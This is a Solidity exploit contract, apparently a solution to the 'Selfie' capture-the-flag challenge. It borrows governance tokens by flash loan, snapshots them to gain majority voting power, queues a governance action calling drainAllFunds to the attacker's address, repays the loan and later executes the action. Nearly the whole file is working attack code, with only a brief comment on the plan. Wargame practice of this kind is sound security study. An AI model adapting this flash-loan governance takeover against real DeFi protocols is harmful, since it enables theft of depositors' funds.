
// Idea is to loan more than half the total governance to queue action
// Once action is queued, execute it after 2 days

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISnapshotToken is IERC20 {
    function snapshot() external returns (uint256);
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface ISelfieTokenReceiver {
    function receiveTokens(address,uint256) external;
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

contract SelfieExploit is ISelfieTokenReceiver{
    address attacker;
    uint256 actionId;
    ISnapshotToken lpToken;
    ISelfiePool pool;
    ISimpleGovernance governance;

    function receiveTokens(address _token, uint256 _amount) external override {
        bytes memory drainageData = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        lpToken.snapshot();
        actionId = governance.queueAction(address(pool), drainageData, 0);
        lpToken.transfer(msg.sender, _amount);
    }

    function stage(address _lpToken, address _pool, uint256 _amount, address _governance) external {
        attacker = msg.sender;
        lpToken = ISnapshotToken(_lpToken);
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        pool.flashLoan(_amount);
    }

    function exploit() external {
        governance.executeAction(actionId);
    }
}